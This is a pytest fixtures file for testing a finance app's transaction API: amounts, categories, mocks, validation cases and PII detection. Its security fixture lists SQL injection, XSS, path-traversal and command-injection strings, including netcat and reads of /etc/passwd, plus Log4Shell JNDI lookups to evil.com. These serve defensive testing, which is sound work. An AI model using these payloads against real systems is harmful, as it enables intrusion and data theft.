"""
Test Configuration and Fixtures for Transaction CRUD Tests

Provides specialized fixtures and configuration for comprehensive
transaction testing including financial validation and security.
"""

import pytest
from decimal import Decimal
from datetime import datetime, timedelta
from unittest.mock import Mock, patch
from typing import List, Dict, Any

from app.models.transaction import Transaction, Category, CategorizationRule
from app.models.user import User
from app.schemas.transaction import TransactionCreate, TransactionUpdate


@pytest.fixture
def financial_test_amounts():
    """Test amounts covering various financial scenarios"""
    return [
        # Basic amounts
        Decimal('0.01'),       # Minimum positive
        Decimal('1.00'),       # Basic unit
        Decimal('10.50'),      # Standard transaction
        Decimal('100.00'),     # Round amount
        Decimal('999.99'),     # Near thousand
        
        # Larger amounts
        Decimal('1000.00'),    # Thousand
        Decimal('5000.00'),    # SAR monitoring threshold
        Decimal('9999.99'),    # Just under reporting threshold
        Decimal('10000.00'),   # CTR threshold
        Decimal('50000.00'),   # Large transaction
        
        # Negative amounts (expenses/refunds)
        Decimal('-0.01'),      # Minimum negative
        Decimal('-50.00'),     # Standard expense
        Decimal('-1000.00'),   # Large expense
        
        # Zero amount (for specific transaction types)
        Decimal('0.00')
    ]


@pytest.fixture
def test_transaction_categories():
    """Standard transaction categories for testing"""
    return {
        "Food & Dining": ["Restaurants", "Groceries", "Coffee", "Fast Food"],
        "Transportation": ["Gas", "Public Transit", "Parking", "Taxi"],
        "Shopping": ["Clothing", "Electronics", "Home", "General"],
        "Entertainment": ["Movies", "Concerts", "Games", "Sports"],
        "Bills & Utilities": ["Electric", "Water", "Internet", "Phone"],
        "Income": ["Salary", "Bonus", "Investment", "Other"],
        "Healthcare": ["Medical", "Dental", "Pharmacy", "Insurance"],
        "Education": ["Tuition", "Books", "Supplies", "Training"],
        "Travel": ["Hotels", "Flights", "Car Rental", "Vacation"],
        "Business": ["Office", "Equipment", "Services", "Travel"]
    }


@pytest.fixture
def sample_transaction_descriptions():
    """Sample transaction descriptions for testing"""
    return [
        "Coffee shop morning purchase",
        "Grocery store weekly shopping",
        "Gas station fill-up #123",
        "Monthly salary deposit",
        "Restaurant dinner with friends",
        "Amazon online purchase",
        "Electric bill payment",
        "ATM cash withdrawal",
        "Mobile phone service payment",
        "Parking meter downtown"
    ]


@pytest.fixture
def test_vendor_names():
    """Test vendor names for validation"""
    return [
        "Starbucks Coffee #1234",
        "Walmart Supercenter",
        "Shell Gas Station",
        "McDonald's Restaurant",
        "Amazon.com Services LLC",
        "Target Store #5678",
        "CVS Pharmacy",
        "Home Depot #9012",
        "Uber Technologies",
        "PayPal Inc"
    ]


@pytest.fixture
def comprehensive_transaction_data():
    """Comprehensive transaction test data covering various scenarios"""
    return [
        # Standard expense transaction
        {
            "date": datetime(2024, 1, 15, 10, 30),
            "amount": Decimal('-85.50'),
            "description": "Grocery store weekly shopping",
            "vendor": "Walmart Supercenter",
            "category": "Food & Dining",
            "subcategory": "Groceries",
            "is_income": False,
            "source": "csv",
            "import_batch": "batch_001"
        },
        
        # Income transaction
        {
            "date": datetime(2024, 1, 14, 9, 0),
            "amount": Decimal('3500.00'),
            "description": "Monthly salary deposit",
            "vendor": "Acme Corporation",
            "category": "Income",
            "subcategory": "Salary",
            "is_income": True,
            "source": "bank_sync"
        },
        
        # Small transaction
        {
            "date": datetime(2024, 1, 13, 8, 15),
            "amount": Decimal('-4.75'),
            "description": "Coffee shop morning brew",
            "vendor": "Starbucks Coffee #1234",
            "category": "Food & Dining",
            "subcategory": "Coffee",
            "is_income": False,
            "source": "card"
        },
        
        # Large transaction (compliance monitoring)
        {
            "date": datetime(2024, 1, 12, 14, 45),
            "amount": Decimal('-12000.00'),
            "description": "Equipment purchase for business",
            "vendor": "Business Equipment LLC",
            "category": "Business",
            "subcategory": "Equipment",
            "is_income": False,
            "source": "manual"
        },
        
        # Cash transaction
        {
            "date": datetime(2024, 1, 11, 16, 20),
            "amount": Decimal('-200.00'),
            "description": "ATM cash withdrawal",
            "vendor": "First National Bank ATM",
            "category": "Cash & ATM",
            "subcategory": "Withdrawal",
            "is_income": False,
            "source": "atm"
        },
        
        # Refund transaction
        {
            "date": datetime(2024, 1, 10, 11, 30),
            "amount": Decimal('45.99'),
            "description": "Product return refund",
            "vendor": "Amazon.com",
            "category": "Shopping",
            "subcategory": "Refund",
            "is_income": True,
            "source": "api"
        }
    ]


@pytest.fixture
def malicious_input_samples():
    """Sample malicious inputs for security testing"""
    return {
        "sql_injection": [
            "'; DROP TABLE transactions; --",
            "1' OR '1'='1",
            "admin'--",
            "' UNION SELECT * FROM users --",
            "; DELETE FROM transactions WHERE 1=1 --"
        ],
        "xss": [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "';alert('xss');//",
            "<iframe src='javascript:alert(1)'></iframe>"
        ],
        "path_traversal": [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//etc/passwd"
        ],
        "command_injection": [
            "; cat /etc/passwd",
            "| nc -l 1234",
            "&& whoami",
            "`id`",
            "$(whoami)"
        ],
        "ldap_injection": [
            "${jndi:ldap://evil.com/a}",
            "${jndi:rmi://evil.com/a}",
            "${jndi:dns://evil.com/a}"
        ]
    }


@pytest.fixture
def pii_test_data():
    """Sample PII data for detection and sanitization testing"""
    return {
        "credit_cards": [
            "4111-1111-1111-1111",  # Visa test
            "5555 5555 5555 4444",  # Mastercard test
            "378282246310005",      # Amex test
            "4000000000000002"      # Visa test
        ],
        "ssns": [
            "123-45-6789",
            "987 65 4321",
            "555123456"
        ],
        "phone_numbers": [
            "555-123-4567",
            "(555) 123-4567",
            "555.123.4567",
            "15551234567"
        ],
        "email_addresses": [
            "test@example.com",
            "user.name@domain.org",
            "firstname.lastname@company.co.uk"
        ],
        "account_numbers": [
            "12345678",
            "987654321012",
            "ACC123456789"
        ]
    }


@pytest.fixture
def boundary_test_values():
    """Boundary values for comprehensive testing"""
    return {
        "amounts": {
            "min_positive": Decimal('0.01'),
            "max_positive": Decimal('999999999999.99'),
            "min_negative": Decimal('-0.01'),
            "max_negative": Decimal('-999999999999.99'),
            "zero": Decimal('0.00'),
            "almost_max": Decimal('999999999999.98'),
            "ctr_threshold": Decimal('10000.00'),
            "sar_threshold": Decimal('5000.00')
        },
        "dates": {
            "today": datetime.now(),
            "yesterday": datetime.now() - timedelta(days=1),
            "one_week_ago": datetime.now() - timedelta(weeks=1),
            "one_month_ago": datetime.now() - timedelta(days=30),
            "one_year_ago": datetime.now() - timedelta(days=365),
            "max_past": datetime.now() - timedelta(days=7*365),  # 7 years
            "tomorrow": datetime.now() + timedelta(days=1),
            "far_future": datetime.now() + timedelta(days=365)
        },
        "strings": {
            "min_length": "ABC",  # 3 characters
            "max_length": "A" * 500,  # 500 characters
            "empty": "",
            "whitespace_only": "   ",
            "unicode_chars": "éñüñüçïøñ",
            "special_chars": "!@#$%^&*()",
            "numbers_only": "1234567890"
        }
    }


@pytest.fixture
def performance_test_data():
    """Large dataset for performance testing"""
    def generate_large_dataset(size: int = 1000) -> List[Dict[str, Any]]:
        transactions = []
        categories = ["Food & Dining", "Transportation", "Shopping", "Entertainment", "Bills & Utilities"]
        vendors = ["Vendor A", "Vendor B", "Vendor C", "Vendor D", "Vendor E"]
        
        for i in range(size):
            transactions.append({
                "date": datetime(2024, 1, 1) + timedelta(days=i % 365, hours=i % 24),
                "amount": Decimal(f'{10 + (i % 1000)}.{i % 100:02d}'),
                "description": f"Performance test transaction {i + 1}",
                "vendor": vendors[i % len(vendors)],
                "category": categories[i % len(categories)],
                "subcategory": f"Subcategory {i % 5 + 1}",
                "is_income": i % 10 == 0,  # 10% income transactions
                "source": "performance_test",
                "import_batch": f"batch_{i // 100}"
            })
        
        return transactions
    
    return generate_large_dataset


@pytest.fixture
def mock_financial_validators():
    """Mock financial validators for testing"""
    with patch('app.core.financial_validators.TransactionValidator') as mock_validator:
        mock_instance = Mock()
        mock_instance.validate_transaction_amount.return_value = Mock(
            amount=Decimal('100.00'),
            currency='USD'
        )
        mock_instance.validate_transaction_date.return_value = datetime.now()
        mock_instance.validate_transaction_description.return_value = "Validated description"
        mock_validator.return_value = mock_instance
        yield mock_instance


@pytest.fixture
def mock_compliance_validator():
    """Mock compliance validator for testing"""
    with patch('app.core.financial_validators.ComplianceValidator') as mock_validator:
        mock_instance = Mock()
        mock_instance.check_ctr_requirement.return_value = False
        mock_instance.check_sar_monitoring.return_value = False
        mock_instance.validate_customer_information.return_value = {}
        mock_validator.return_value = mock_instance
        yield mock_instance


@pytest.fixture
def mock_input_sanitizer():
    """Mock input sanitizer for testing"""
    with patch('app.core.security_utils.input_sanitizer') as mock_sanitizer:
        mock_sanitizer.sanitize_financial_input.side_effect = lambda x, **kwargs: x.replace('<script>', '[SCRIPT]').replace('DROP TABLE', '[SQL]')
        yield mock_sanitizer


@pytest.fixture
def database_error_scenarios():
    """Database error scenarios for testing"""
    from sqlalchemy.exc import SQLAlchemyError, IntegrityError, DataError
    
    return {
        "connection_error": SQLAlchemyError("Database connection failed"),
        "integrity_error": IntegrityError("Foreign key constraint violation", None, None),
        "data_error": DataError("Invalid data format", None, None),
        "timeout_error": SQLAlchemyError("Query timeout exceeded")
    }


@pytest.fixture
def concurrent_test_helper():
    """Helper for concurrent testing scenarios"""
    import threading
    import time
    
    class ConcurrentTestHelper:
        def __init__(self):
            self.results = []
            self.lock = threading.Lock()
        
        def add_result(self, result):
            with self.lock:
                self.results.append(result)
        
        def run_concurrent_operations(self, operation_func, num_threads=5, *args, **kwargs):
            threads = []
            
            def worker():
                try:
                    result = operation_func(*args, **kwargs)
                    self.add_result(("success", result))
                except Exception as e:
                    self.add_result(("error", str(e)))
            
            # Create and start threads
            for _ in range(num_threads):
                thread = threading.Thread(target=worker)
                threads.append(thread)
                thread.start()
            
            # Wait for all threads to complete
            for thread in threads:
                thread.join()
            
            return self.results
    
    return ConcurrentTestHelper()


@pytest.fixture
def transaction_test_scenarios():
    """Comprehensive test scenarios for transaction operations"""
    return {
        "create_scenarios": [
            {
                "name": "basic_expense",
                "data": {
                    "date": "2024-01-15T10:30:00",
                    "amount": "-50.00",
                    "description": "Coffee shop purchase"
                },
                "expected_status": 201
            },
            {
                "name": "income_transaction",
                "data": {
                    "date": "2024-01-15T09:00:00",
                    "amount": "3500.00",
                    "description": "Salary deposit",
                    "is_income": True
                },
                "expected_status": 201
            },
            {
                "name": "invalid_amount",
                "data": {
                    "date": "2024-01-15T10:30:00",
                    "amount": "invalid",
                    "description": "Test transaction"
                },
                "expected_status": 422
            },
            {
                "name": "missing_required_field",
                "data": {
                    "amount": "50.00",
                    "description": "Test transaction"
                    # Missing date
                },
                "expected_status": 422
            }
        ],
        "update_scenarios": [
            {
                "name": "category_update",
                "data": {
                    "category": "Food & Dining",
                    "subcategory": "Restaurants"
                },
                "expected_status": 200
            },
            {
                "name": "invalid_category_length",
                "data": {
                    "category": "A" * 101  # Exceeds max length
                },
                "expected_status": 422
            }
        ],
        "filter_scenarios": [
            {
                "name": "category_filter",
                "params": {"category": "Food & Dining"},
                "expected_status": 200
            },
            {
                "name": "date_range_filter",
                "params": {
                    "start_date": "2024-01-01T00:00:00",
                    "end_date": "2024-01-31T23:59:59"
                },
                "expected_status": 200
            },
            {
                "name": "amount_range_filter",
                "params": {
                    "min_amount": "10.00",
                    "max_amount": "100.00"
                },
                "expected_status": 200
            }
        ]
    }


@pytest.fixture
def validation_test_cases():
    """Validation test cases for comprehensive coverage"""
    return {
        "amount_validation": [
            ("100.00", True, "Valid amount"),
            ("0.01", True, "Minimum valid amount"),
            ("999999999999.99", True, "Maximum valid amount"),
            ("-50.00", True, "Valid negative amount"),
            ("0.00", True, "Zero amount"),
            ("abc", False, "Non-numeric amount"),
            ("100.123", False, "Too many decimal places"),
            ("1000000000000.00", False, "Exceeds maximum"),
            ("", False, "Empty amount")
        ],
        "date_validation": [
            ("2024-01-15T10:30:00", True, "Valid ISO datetime"),
            ("2024-01-15", True, "Valid date only"),
            (datetime.now().isoformat(), True, "Current datetime"),
            ("invalid-date", False, "Invalid date format"),
            ("2024-13-45", False, "Invalid date values"),
            ("2030-01-15T10:30:00", False, "Too far in future")
        ],
        "description_validation": [
            ("Coffee shop purchase", True, "Valid description"),
            ("Valid transaction description", True, "Normal description"),
            ("AB", False, "Too short"),
            ("A" * 501, False, "Too long"),
            ("", False, "Empty description"),
            ("   ", False, "Whitespace only")
        ],
        "source_validation": [
            ("csv", True, "Valid source"),
            ("api", True, "Valid source"),
            ("manual", True, "Valid source"),
            ("bank_sync", True, "Valid source"),
            ("invalid_source", False, "Invalid source")
        ]
    }


# Pytest configuration for transaction tests
def pytest_configure(config):
    """Configure pytest for transaction testing"""
    # Add custom markers
    config.addinivalue_line("markers", "financial: mark test as financial validation test")
    config.addinivalue_line("markers", "security: mark test as security-related test")
    config.addinivalue_line("markers", "performance: mark test as performance test")
    config.addinivalue_line("markers", "integration: mark test as integration test")
    config.addinivalue_line("markers", "crud: mark test as CRUD operation test")


# Custom assertions for transaction testing
def assert_transaction_response_format(response_data):
    """Assert that transaction response has correct format"""
    required_fields = ["id", "date", "amount", "description", "user_id", "created_at"]
    
    for field in required_fields:
        assert field in response_data, f"Missing required field: {field}"
    
    # Validate data types
    assert isinstance(response_data["id"], int)
    assert isinstance(response_data["user_id"], int)
    assert response_data["amount"] is not None
    assert isinstance(response_data["description"], str)


def assert_financial_amount_valid(amount_str):
    """Assert that amount is valid financial format"""
    try:
        decimal_amount = Decimal(amount_str)
        # Check precision (max 2 decimal places for most currencies)
        decimal_places = decimal_amount.as_tuple().exponent
        assert decimal_places >= -2, "Amount has too many decimal places"
        return True
    except (ValueError, InvalidOperation):
        return False


def assert_no_pii_in_response(response_data):
    """Assert that response doesn't contain PII"""
    response_str = str(response_data)
    
    # Check for credit card patterns
    assert not re.search(r'\b\d{4}[\s\-]?\d{4}[\s\-]?\d{4}[\s\-]?\d{4}\b', response_str)
    
    # Check for SSN patterns
    assert not re.search(r'\b\d{3}[\s\-]?\d{2}[\s\-]?\d{4}\b', response_str)
    
    # Check for phone patterns
    assert not re.search(r'\b\d{3}[\s\-]?\d{3}[\s\-]?\d{4}\b', response_str)


def assert_no_malicious_content(response_data):
    """Assert that response doesn't contain malicious content"""
    response_str = str(response_data)
    
    malicious_patterns = [
        "<script>", "javascript:", "DROP TABLE", "UNION SELECT",
        "../../", "${jndi:", "<iframe", "eval("
    ]
    
    for pattern in malicious_patterns:
        assert pattern not in response_str, f"Malicious pattern found: {pattern}"